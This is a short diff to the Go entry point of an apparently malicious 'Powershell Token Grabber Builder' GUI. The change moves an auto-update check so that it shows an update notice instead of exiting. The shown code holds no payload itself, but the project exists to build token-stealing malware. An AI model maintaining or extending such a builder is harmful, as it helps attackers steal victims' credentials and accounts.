@@ -1,11 +1,11 @@
 package main
 
 import (
-	"os"
 	"time"
 
 	"builder/modules/autoUpdate"
 	"builder/modules/cursed"
+	"builder/modules/options/utils"
 	"builder/ui-tabs/batchTab"
 	"builder/ui-tabs/exeTab"
 	"builder/ui-tabs/homeTab"
@@ -19,14 +19,14 @@ import (
 )
 
 func main() {
-	if !(autoUpdate.AutoUpdate()) {
-		os.Exit(1)
-	}
-
 	a := app.New()
 	win := a.NewWindow(cursed.Generate("Powershell Token Grabber Builder", "normal", true, true, true))
 	win.Resize(fyne.NewSize(500, 400))
 	win.CenterOnScreen()
+
+	if !autoUpdate.AutoUpdate() {
+		utils.MakeSuccessMessage(a, "A NEW UPDATE IS AVAILABLE! PLEASE DOWNLOAD IT FROM THE GITHUB REPO!")
+	}
 
 	tabs := container.NewAppTabs(
 		container.NewTabItem("Home", homeTab.GetHomeTab(a)),
